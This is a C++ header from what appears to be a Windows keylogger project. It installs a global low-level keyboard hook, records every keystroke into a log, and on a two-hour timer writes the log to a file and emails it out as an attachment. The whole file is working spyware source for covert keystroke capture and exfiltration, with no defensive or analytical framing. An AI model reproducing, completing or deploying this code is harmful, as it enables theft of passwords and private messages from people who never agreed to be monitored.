#pragma once
#ifndef KEYHOOK_H
#define KEYHOOK_H

#include <string>
#include "IO.h"
#include "SendMail.h"
#include "Timer.h"
#include "KeyConstants.h"

std::string keylog{};

void sendMailHandler() {
	if (keylog.empty())
		return;
	std::string last_file{ IO::writeKeyLog(keylog) };
	if (last_file.empty()) {
		IO::writeAppLog("File creation was not successful. Keylog '" + keylog + "'");
		return;
	}
	int code{ Mail::sendMail("Log [" + last_file + "]",//subject
		"File has been attached to email\n" + keylog,//body
		IO::getDirectoryPath(true) + last_file) };//attachments
	if (code != 7)
		IO::writeAppLog("Email was not sent! Error code: " + std::to_string(code));
	else
		keylog.clear();
}
/*timer is in milliseconds 30000ms = 30s. Currently set for two hours */
Timer emailSenderTimer(sendMailHandler, 7200 * 1000, Timer::infinite);

HHOOK eHook{};
/*main function*/
LRESULT ourkeyboardProc(int ncode, WPARAM wparam, LPARAM lparam) {
	if (ncode < 0)
		CallNextHookEx(eHook, ncode, wparam, lparam);
	
	KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lparam;
	/*press and hold down system key*/
	if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN) {
		keylog += Keys::keys[kbs->vkCode].value;
		/*log new line if enter is pressed*/
		if (kbs->vkCode == VK_RETURN)
			keylog += '\n';
	}
	else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP) {
		DWORD key = kbs->vkCode;
		if (key == VK_CONTROL ||
			key == VK_LCONTROL ||
			key == VK_RCONTROL ||
			key == VK_SHIFT ||
			key == VK_LSHIFT ||
			key == VK_RSHIFT ||
			key == VK_MENU ||
			key == VK_LMENU ||
			key == VK_RMENU ||
			key == VK_CAPITAL ||
			key == VK_NUMLOCK ||
			key == VK_LWIN ||
			key == VK_RWIN) {
			std::string keyname{ Keys::keys[kbs->vkCode].value };
			keyname.insert(1, "/");
			keylog += keyname;
		}
	}
	return CallNextHookEx(eHook, ncode, wparam, lparam);
}
bool installHook() {
	IO::writeAppLog("Hook started...");
	emailSenderTimer.start(true);
	eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)ourkeyboardProc, GetModuleHandle(NULL), 0);
	return eHook == NULL;
}
bool uninstallHook() {
	BOOL b = UnhookWindowsHookEx(eHook);
	eHook = NULL;
	return b;
}
bool isHooked() {
	return eHook == NULL;
}

#endif